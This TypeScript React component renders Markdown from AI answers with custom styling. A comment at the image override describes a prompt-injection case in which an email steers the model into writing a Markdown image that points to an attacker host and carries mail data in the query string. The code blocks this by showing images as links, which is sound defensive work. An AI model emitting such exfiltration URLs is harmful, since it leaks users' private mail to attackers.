import type { Components } from 'react-markdown'

import React from 'react'

import { cn } from '@/lib/utils'

// The parser is ~100 kB and only AI answers need it, so it loads on the first one.
const ReactMarkdown = React.lazy(() => import('react-markdown'))

// No typography plugin here, so each element gets its spacing explicitly.
// Bold text is the model's way of flagging what matters: show it highlighted.
const components: Components = {
  p: ({ node: _, ...props }) => (
    <p className="leading-relaxed [&:not(:first-child)]:mt-2" {...props} />
  ),
  ul: ({ node: _, ...props }) => <ul className="mt-2 list-disc space-y-1 pl-5" {...props} />,
  ol: ({ node: _, ...props }) => <ol className="mt-2 list-decimal space-y-1 pl-5" {...props} />,
  h1: ({ node: _, ...props }) => <h3 className="mt-3 text-sm font-semibold" {...props} />,
  h2: ({ node: _, ...props }) => <h3 className="mt-3 text-sm font-semibold" {...props} />,
  h3: ({ node: _, ...props }) => <h3 className="mt-3 text-sm font-semibold" {...props} />,
  strong: ({ node: _, ...props }) => (
    <strong
      className="rounded bg-amber-200/70 px-1 font-semibold text-amber-950 dark:bg-amber-400/25 dark:text-amber-100"
      {...props}
    />
  ),
  a: ({ node: _, ...props }) => (
    <a
      className="text-blue-600 underline dark:text-blue-400"
      target="_blank"
      rel="noreferrer"
      {...props}
    />
  ),
  // Never load an image from model output: an email can steer the model into
  // writing ![](https://attacker/?d=<mail data>), and the browser would fetch
  // it at once. The address shows as a link the user may choose to open.
  img: ({ alt, src }) => (
    <a
      href={typeof src === 'string' ? src : undefined}
      target="_blank"
      rel="noreferrer"
      className="underline"
    >
      {alt || 'image'}
    </a>
  ),
  code: ({ node: _, ...props }) => (
    <code className="bg-muted rounded px-1 text-[0.9em]" {...props} />
  ),
}

/** Renders Markdown from an untrusted source: react-markdown never renders raw HTML. */
export default function Markdown({
  children,
  className,
}: {
  children: string
  className?: string
}) {
  return (
    <div className={cn('text-sm', className)}>
      {/* Until the parser arrives, the text shows as written. */}
      <React.Suspense fallback={<p className="leading-relaxed whitespace-pre-wrap">{children}</p>}>
        <ReactMarkdown components={components}>{children}</ReactMarkdown>
      </React.Suspense>
    </div>
  )
}
